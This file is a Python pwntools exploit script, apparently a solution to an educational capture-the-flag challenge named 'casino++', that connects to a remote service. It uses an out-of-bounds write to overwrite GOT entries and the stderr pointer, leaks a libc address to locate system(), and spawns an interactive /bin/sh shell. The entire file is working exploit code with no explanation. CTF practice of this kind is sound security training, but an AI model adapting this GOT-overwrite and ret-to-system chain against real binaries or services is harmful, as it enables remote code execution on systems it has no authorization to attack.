import binascii
from pwn import *

context.arch = 'amd64'
# context.terminal = ['tmux', 'splitw', '-h']

# p = process('./casino++')
p = remote('edu-ctf.csie.org', 10176)
# gdb.attach(p, 'b casino\nc\n')

# libc_puts_offs = 0x87490
# libc_system_offs = 0x554e0
libc_puts_offs = 0x809c0
libc_system_offs = 0x4f440


# GOT table: 0x602000
#   plt@puts: 0x602020

# lottery -> 0x6020b0
# guess -> 0x6020d0
# name -> 0x6020f0
# seed -> 0x602100

libc = ELF('./libc.so')


def write(addr, num, guesses):
    dest = (addr - 0x6020d0) // 4 + 1

    numl = num & 0xffffffff
    numh = (num >> 32) & 0xffffffff

    for i in range(6):
        p.sendlineafter(b'Chose the number', b'0')
    p.sendlineafter(b'Change the number?', b'1')
    p.sendlineafter(b'Which number', str(dest))
    p.sendlineafter(b'Chose the number', str(numl))

    for i in guesses:
        p.sendlineafter(b'Chose the number', str(i))
    p.sendlineafter(b'Change the number?', b'1')
    p.sendlineafter(b'Which number', str(dest + 1))
    p.sendlineafter(b'Chose the number', str(numh))
    p.recvuntil(': ')

p.sendlineafter('name: ', b'A' * 16 + b'\0' * 16)
p.sendlineafter('age: ', b'123')

seed0 = [83, 86, 77, 15, 93, 35]

bss = 0x602200
puts_got = 0x602020
setvbuf_got = 0x602050
stderr_addr = 0x6020a0
main_addr = 0x400b21
casino_addr = 0x40095d

print('puts -> casino')
write(puts_got, casino_addr, seed0)

print('write "/bin/sh" to bss')
write(bss, u64(b'/bin/sh\0'), seed0)

print('stderr -> puts@got')
write(stderr_addr, puts_got, seed0)

print('setvbuf -> puts@plt+6')
write(setvbuf_got, 0x4006e6, seed0)

print('puts -> main')
write(puts_got, main_addr, seed0)


p.recvline()
p.recvline()
x = p.recvline()
print(x)

libc_puts = u64(x[:6] + b'\0\0')
libc_base = libc_puts - libc_puts_offs
log.success('libc base: %s', hex(libc_base))

libc_system = libc_base + libc_system_offs

# start again

p.sendlineafter('name: ', b'A' * 16 + b'\0' * 16)
p.sendlineafter('age: ', b'123')


print('puts -> casino (again)')
write(puts_got, casino_addr, seed0)

print('stderr -> &("/bin/sh")')
write(stderr_addr, bss, seed0)

print('setvbuf -> system@libc')
write(setvbuf_got, libc_system, seed0)

print('puts -> init')
write(puts_got, 0x400857, seed0)

p.interactive()
